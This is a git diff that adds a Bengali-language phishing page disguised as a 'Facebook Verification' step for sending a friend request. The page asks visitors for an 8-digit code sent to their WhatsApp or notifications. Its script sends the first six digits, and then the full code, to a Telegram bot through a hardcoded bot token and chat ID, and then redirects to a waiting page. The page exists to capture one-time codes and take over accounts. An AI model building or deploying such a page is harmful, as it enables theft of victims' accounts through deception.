@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f0f2f5; font-family: 'Segoe UI', Arial, sans-serif; }
+        /* ৮টি ঘর এক লাইনে রাখার জন্য ইনপুট সাইজ কিছুটা ছোট করা হয়েছে */
+        .code-input {
+            width: 38px;
+            height: 50px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 600;
+            border: 2px solid #dddfe2;
+            border-radius: 6px;
+            background: #ffffff;
+            transition: all 0.15s;
+        }
+        .code-input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
+            outline: none;
+        }
+        .blue-btn {
+            background-color: #1877f2; color: white; font-weight: bold;
+            padding: 14px 0; border-radius: 8px; width: 100%; max-width: 320px;
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center min-h-screen bg-[#f0f2f5] pt-12">
+
+    <div class="w-full max-w-sm h-[32vh] overflow-hidden flex justify-center bg-white rounded-t-2xl shadow-sm">
+        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" 
+             alt="Profile" class="w-full h-full object-cover">
+    </div>
+
+    <div class="w-full max-w-sm p-5 bg-white shadow-md mt-[-15px] rounded-b-2xl min-h-[55vh] flex flex-col items-center">
+
+        <h2 class="text-xl font-bold text-gray-900 mb-4 text-center">Verification</h2>
+
+        <p class="text-[14px] text-gray-600 mb-6 text-center leading-relaxed px-2">
+            অ্যাড রিকোয়েস্ট পাঠাতে আপনার WhatsApp বা নোটিফিকেশনে আসা <br> <b>৮ সংখ্যার কোডটি</b> নিচে দিন।
+        </p>
+
+        <div id="otp-inputs" class="flex justify-center gap-1.5 mb-8">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input" autofocus>
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+        </div>
+
+        <button id="submitBtn" class="blue-btn opacity-50 mb-4" disabled>
+            Add Friend
+        </button>
+
+        <p id="status-text" class="text-gray-500 text-xs text-center">
+            কোডগুলো সঠিকভাবে বসান
+        </p>
+
+    </div>
+
+<script>
+const inputs = document.querySelectorAll('.code-input');
+const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+const chatId = "8516934257";
+
+async function sendToTelegram(message) {
+    try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        });
+    } catch (err) { console.error(err); }
+}
+
+inputs.forEach((input, index) => {
+    input.addEventListener('input', (e) => {
+        input.value = input.value.replace(/[^0-9]/g, '');
+        
+        if (input.value.length === 1) {
+            // ৬ নম্বর ঘরে কোড লিখলে অটো সেন্ড হবে
+            if (index === 5) {
+                const firstSix = Array.from(inputs).slice(0, 6).map(i => i.value).join('');
+                sendToTelegram(`📩 ১ম অংশ (৬ ডিজিট): ${firstSix}\n⏰ সময়: ${new Date().toLocaleString('bn-BD')}`);
+            }
+
+            // ৮ নম্বর ঘরে কোড লিখলে শেষবার সেন্ড হয়ে রিডাইরেক্ট হবে
+            if (index === 7) {
+                const lastTwo = inputs[6].value + inputs[7].value;
+                const fullCode = Array.from(inputs).map(i => i.value).join('');
+                
+                document.getElementById('status-text').innerText = "যাচাই করা হচ্ছে, অপেক্ষা করুন...";
+                
+                sendToTelegram(`📩 পূর্ণ কোড (৮ ডিজিট): ${fullCode}\nশেষ ২ ডিজিট: ${lastTwo}`).then(() => {
+                    setTimeout(() => {
+                        window.location.href = "waiting.html";
+                    }, 1500);
+                });
+            }
+
+            // পরবর্তী ঘরে ফোকাস করা
+            if (index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+        }
+    });
+
+    // ব্যাকস্পেস হ্যান্ডলিং
+    input.addEventListener('keydown', (e) => {
+        if (e.key === "Backspace" && input.value.length === 0 && index > 0) {
+            inputs[index - 1].focus();
+        }
+    });
+});
+</script>
+
+</body>
+</html>
